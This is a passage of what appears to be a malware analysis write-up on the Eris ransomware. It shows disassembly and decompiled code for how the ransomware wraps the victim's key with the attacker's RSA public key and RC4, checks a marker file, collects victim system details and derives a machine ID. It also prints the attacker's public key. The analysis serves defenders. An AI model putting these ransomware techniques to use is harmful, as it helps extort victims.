<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe66f</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.Eris_Utils.Exists</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe674</span>  <span style="color:#66d9ef">movzx</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe679</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">al</span>, <span style="color:#66d9ef">al</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe67b</span>  <span style="color:#66d9ef">je</span> <span style="color:#ae81ff">0x5ff0c4</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe681</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">pky_path_str</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe688</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe68b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">pky_path_str_len</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe692</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe696</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.main.ReadFileA</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe69b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_14h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe69f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe6a3</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe6a7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe6ab</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
</code></pre></div><p>The victim&rsquo;s private key is encrypted with the threat actor&rsquo;s public key.  The
encrypted blob is further encrypted RC4.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff212</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">esi</span>, [<span style="color:#ae81ff">0x68736a</span>] <span style="color:#75715e">; Public key
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005ff218</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.0044d9f0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff21d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_174h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff224</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff227</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">0x80</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff22f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">0x80</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff237</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff23b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#ae81ff">0x1c3</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff243</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_14h</span>], <span style="color:#ae81ff">0x1c3</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff24b</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.Eris_Cryptography.RSAEncrypt</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff250</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_20h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff254</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8ch</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff25b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_1ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff25f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_84h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff266</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff26a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_140h</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff271</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_148h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff278</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff27b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_98h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff282</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff286</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_9ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff28d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff291</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_174h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff298</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff29c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#ae81ff">0x80</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff2a4</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_14h</span>], <span style="color:#ae81ff">0x80</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff2ac</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.Eris_Cryptography.RC4Encrypt</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff2b1</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_1ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff2b5</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_88h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff2bc</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff2c0</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_13ch</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff2c7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_20h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005ff2cb</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_90h</span>], <span style="color:#66d9ef">edx</span>
</code></pre></div><p>Threat actor&rsquo;s key:</p>
<pre><code>--BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiVFawLHK0Gld4XUYi7Wq
1ura1N78VvOuW4kvH/yDYOajqRx7nqFB2mokTDqHa5phT48FtLMbuFc+j39YnZBa
jjSN2zDaC13vDRNXfiW41yJAtMAJXh17cE/lAdAgEUQdYwJPVHfDuCPGGO5Dn+hg
xehdJvIiNFbKCCFP7EojDH0kK1h9p8TngwqHySBNLUADKeONKPk171oe+5isEnbF
VjBcinGF13V/CRBKXsrH2z7BCWtyZTG+MWXRqUOn2mYOFgt4ZNOe4U0nz6/A1YmJ
V8NybH2vHp4Bs/ov7RcnQUvW0BwG0/xp6YDSaOt59A0rEbJE0+J3NTlEVPesehOr
xwIDAQAB
-----END PUBLIC KEY-----
</code></pre><p>The malware also looks for the existence of the file: <code>C:\eris.was</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe7f2</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#ae81ff">0x675b79</span>] <span style="color:#75715e">; &#34;C:\eris.was&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005fe7f8</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe7fb</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">0xb</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe803</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.Eris_Utils.Exists</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe808</span>  <span style="color:#66d9ef">movzx</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe80d</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">al</span>, <span style="color:#66d9ef">al</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe80f</span>  <span style="color:#66d9ef">jne</span> <span style="color:#ae81ff">0x5ff05d</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe815</span>  <span style="color:#66d9ef">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe817</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_94h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe81e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">session</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe825</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x14</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe828</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x18</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe82b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebp</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x1c</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe82e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe831</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe835</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">ebp</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe839</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.Eris_Sync.GetSyns</span>
</code></pre></div><h3 id="victim-information">Victim information</h3>
<p>The Eris malware collects information about the infected system. The data is
populated into the structure shown below.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Struct</span>.<span style="color:#a6e22e">BotJson</span> <span style="color:#66d9ef">struct</span>{
    <span style="color:#a6e22e">UID</span> <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">SID</span> <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">Kind</span> <span style="color:#66d9ef">int</span>
    <span style="color:#a6e22e">Storage</span> []<span style="color:#66d9ef">struct</span> {
        <span style="color:#a6e22e">Alphabet</span> <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;alphabet&#34;`</span>
        <span style="color:#a6e22e">Label</span> <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;label&#34;`</span>
        <span style="color:#a6e22e">Type</span> <span style="color:#66d9ef">int</span> <span style="color:#e6db74">`json:&#34;type&#34;`</span>
        <span style="color:#a6e22e">Free</span> <span style="color:#66d9ef">int64</span> <span style="color:#e6db74">`json:&#34;free&#34;`</span>
        <span style="color:#a6e22e">Full</span> <span style="color:#66d9ef">int64</span> <span style="color:#e6db74">`json:&#34;full&#34;`</span>
    }
    <span style="color:#a6e22e">Extension</span> <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">OS</span> <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">UserName</span> <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">PCName</span> <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">Country</span> <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">City</span> <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">IP</span> <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">Org</span> <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">Stage1</span> <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">Stage2</span> <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">Date</span> <span style="color:#66d9ef">int64</span>
}
</code></pre></div><p>Username is collected from the environment variable and the host name is
retrieved via the standard library function:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8d21</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">ecx</span>, [<span style="color:#ae81ff">0x67505a</span>] <span style="color:#75715e">; &#34;USERNAME&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005f8d27</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8d2a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">8</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8d32</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.os.Getenv</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8d37</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8d3b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8d3f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">username_str</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8d46</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">username_str_len</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8d4d</span>  <span style="color:#66d9ef">nop</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8d4e</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.os.hostname</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8d53</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8d56</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8d5a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8d5e</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8d60</span>  <span style="color:#66d9ef">je</span> <span style="color:#ae81ff">0x5f8f7e</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8d66</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#ae81ff">0x674dca</span>] <span style="color:#75715e">; &#34;unknown&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005f8d6c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">hostname_str</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8d73</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">hostname_str_len</span>], <span style="color:#ae81ff">7</span>
<span style="color:#a6e22e">...</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8f7e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">hostname_str</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8f85</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">hostname_str_len</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8f8c</span>  <span style="color:#66d9ef">jmp</span> <span style="color:#ae81ff">0x5f8d7e</span>
</code></pre></div><p>The ID of the machine is generated from the machine ID.  First the GUID is
fetched from the registry. A summary of the <code>Eris_Sync.machineID</code> function is
shown below.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8a10</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#66d9ef">SOFTWARE</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">Microsoft</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">Cryptography</span><span style="color:#960050;background-color:#1e0010">&#34;</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8a2a</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.golang.org_x_sys_windows_registry.OpenKey</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8a5c</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.runtime.deferproc</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8a63</span> <span style="color:#66d9ef">cjmp</span> <span style="color:#ae81ff">0x005f8b0d</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8a6f</span> <span style="color:#66d9ef">cjmp</span> <span style="color:#ae81ff">0x005f8ae7</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8a78</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#66d9ef">MachineGuid</span><span style="color:#960050;background-color:#1e0010">&#34;</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8a8a</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.golang.org_x_sys_windows_registry_Key.GetStringValue</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8aa1</span> <span style="color:#66d9ef">cjmp</span> <span style="color:#ae81ff">0x005f8ac5</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8abc</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.runtime.deferreturn</span>
<span style="color:#960050;background-color:#1e0010">0</span>x005f8ac5:
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8ade</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.runtime.deferreturn</span>
<span style="color:#960050;background-color:#1e0010">0</span>x005f8ae7:
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8b04</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.runtime.deferreturn</span>
<span style="color:#960050;background-color:#1e0010">0</span>x005f8b0d:
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8b0e</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.runtime.deferreturn</span>
<span style="color:#960050;background-color:#1e0010">0</span>x005f8b17:
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8b17</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.runtime.morestack_noctxt</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8b1c</span> <span style="color:#66d9ef">jmp</span> <span style="color:#ae81ff">0x005f89d0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8b1c</span> <span style="color:#66d9ef">sym.Eris_Sync.machineID</span>
</code></pre></div><p>The GUID is hashed with <em>SHA1</em> and the hex-encoded string is used as the ID. If
no GUID is found, the ID is generated from a set of random bytes.  Below is a
Ghidra decompiled representation of the function.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> sym.Eris_Sync.GetID(undefined4 uParm1, undefined4 uParm2)
{
    uint32_t <span style="color:#f92672">*</span>puVar1;
    int32_t iVar2;
    int32_t iVar3;
    int32_t in_FS_OFFSET;
    undefined4 <span style="color:#f92672">*</span>in_stack_ffffffa4;
    undefined4 <span style="color:#f92672">*</span>in_stack_ffffffa8;
    undefined4 <span style="color:#f92672">*</span>puVar4;
    undefined4 <span style="color:#f92672">*</span>in_stack_ffffffac;
    undefined4 <span style="color:#f92672">*</span>in_stack_ffffffb0;
    int32_t in_stack_ffffffb4;
    uint32_t in_stack_ffffffb8;
    uint32_t uVar5;
    int32_t in_stack_ffffffbc;
    undefined4 uStack56;
    int32_t iStack52;
    undefined4 uStack48;

    sym.Eris_Sync.machineID();
    puVar4 <span style="color:#f92672">=</span> in_stack_ffffffa8;
    <span style="color:#66d9ef">if</span> ((in_stack_ffffffac <span style="color:#f92672">!=</span> (undefined4 <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">&amp;&amp;</span> (in_stack_ffffffa8 <span style="color:#f92672">==</span> (undefined4 <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>)) {
    <span style="color:#75715e">// If no GUID, generate random string.
</span><span style="color:#75715e"></span>        in_stack_ffffffa4 <span style="color:#f92672">=</span> in_stack_ffffffa8;
        in_stack_ffffffa8 <span style="color:#f92672">=</span> in_stack_ffffffac;
        sym.Eris_Utils.RandStringBytes(<span style="color:#ae81ff">0x20</span>);
        puVar4 <span style="color:#f92672">=</span> in_stack_ffffffa4;
    }
    sym.runtime.newobject(sym.type.sha1.digest);
    <span style="color:#f92672">*</span>puVar4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x67452301</span>;
    puVar4[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xefcdab89</span>;
